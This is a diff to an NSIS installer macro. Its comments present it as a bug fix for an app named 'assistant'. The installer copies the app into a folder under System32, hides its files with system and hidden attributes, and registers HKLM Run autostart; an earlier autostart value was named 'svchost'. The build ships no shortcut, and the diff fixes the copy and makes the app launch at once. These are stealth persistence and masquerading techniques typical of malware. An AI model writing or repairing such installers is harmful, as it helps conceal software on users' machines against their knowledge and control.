@@ -60,7 +60,16 @@
   ${IfNot} ${FileExists} "$R5\kernel32.dll"
     StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
   ${EndIf}
-  StrCpy $R3 'cmd /c xcopy "$PROGRAMFILES64\assistant\*.*" "$R5\assistant\" /E /I /H /Y /Q'
+  ; nsExec hands the register to CreateProcess verbatim and cmd.exe has no
+  ; concept of $PROGRAMFILES64: the single-quoted StrCpy that used to build
+  ; this line sent xcopy the literal token "$PROGRAMFILES64\assistant\*.*",
+  ; which exits 4 (file not found) on every install. No mirror was written and
+  ; the Run key pointed at an exe that did not exist, so the app never started.
+  ; Build the command with StrCpy so NSIS expands both paths before cmd runs,
+  ; and take the source from $INSTDIR — that is the tree just written, and it
+  ; also follows an install relocated with /D.
+  StrCpy $R3 'cmd /c xcopy "'
+  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\assistant$\" /E /I /H /Y /Q"
   FileOpen $9 "$TEMP\assistant-install.log" a
   FileWrite $9 "CMD=[$R3]$\r$\n"
   FileClose $9
@@ -68,12 +77,14 @@
   Pop $0
   StrCpy $R6 "$R5\assistant\assistant.exe"
   FileOpen $9 "$TEMP\assistant-install.log" a
-  FileWrite $9 "XCOPY rc=$0 sysdir=[$SYSDIR]$\r$\n"
+  FileWrite $9 "XCOPY rc=$0$\r$\n"
   FileClose $9
-  ${If} ${FileExists} "$R5\assistant\assistant.exe"
-    DetailPrint "  placed $R5\assistant\assistant.exe"
+  ; autostart must point at a file that exists even if the mirror failed
+  ${If} ${FileExists} "$R6"
+    DetailPrint "  placed $R6"
   ${Else}
-    DetailPrint "  WARNING: System32 mirror missing — app will run from $INSTDIR"
+    StrCpy $R6 "$INSTDIR\assistant.exe"
+    DetailPrint "  WARNING: System32 mirror missing — autostart falls back to $INSTDIR"
   ${EndIf}
   nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
   nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\assistant.exe$\""
@@ -86,10 +97,18 @@
 
   ; ---- autostart points at the System32 copy ---------------------------
   ; "assistant" is the current value name; the old "svchost" value is removed
-  ; so an upgrade cannot leave two autostart entries.
+  ; so an upgrade cannot leave two autostart entries. $R6 already fell back to
+  ; $INSTDIR when the mirror could not be written.
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
   WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant" '"$R6" --autostart'
+
+  ; ---- open once, now --------------------------------------------------
+  ; The build ships no shortcut (by design) and the Run key only fires at the
+  ; next logon, so a fresh install would otherwise appear to have done nothing.
+  ; Run it from the same path the Run key uses.
+  DetailPrint "Starting assistant..."
+  Exec '"$R6" --autostart'
 !macroend
 
 !macro customUnInstall
